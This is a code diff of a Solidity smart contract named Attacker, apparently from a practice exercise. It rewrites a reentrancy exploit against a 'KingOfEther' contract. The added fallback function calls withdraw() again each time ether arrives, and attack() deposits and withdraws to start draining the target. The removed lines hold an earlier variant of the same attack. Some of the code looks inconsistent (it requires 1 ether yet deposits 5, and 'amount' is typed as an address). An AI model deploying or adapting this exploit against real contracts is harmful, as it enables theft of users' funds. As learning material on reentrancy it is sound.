@@ -8,31 +8,23 @@ contract Attacker is KingOfEther{
     address public owner;
     address public amount;
 
+    event Bala(uint256);
+
     constructor(address _kingOfEther){
         _kingOf = KingOfEther(_kingOfEther);
         owner = msg.sender;
     }
 
+    fallback() external payable {
+        if(address(_kingOf).balance>= 1e18){
+            _kingOf.withdraw();
+        }
+    }
+
     function attack() public payable{
-        require(msg.value > 0,"sendSomething");
-        _kingOf.deposit(1 ether);
-        if(_kingOf.balance()>0){
-            _kingOf.withdraw();
-            (bool ok,)=payable(address(this)).call{value:msg.value}("");
-            require(ok);
-        }
-    }
-
-    receive() external payable {
-        if (_kingOf.balance()>0){
-            _kingOf.withdraw();
-            (bool ok,)=payable(address(this)).call{value:msg.value}("");
-            require(ok);
-        }
-    }
-
-    function withdrawAttack() public {
-        require(msg.sender == owner,"notOwner");
-        payable(owner).transfer(address(this).balance);
+        require(msg.value>= 1e18);
+        _kingOf.deposit{value: 5e18}(5e18);
+        _kingOf.withdraw();
+        emit Bala(address(this).balance);
     }
 }
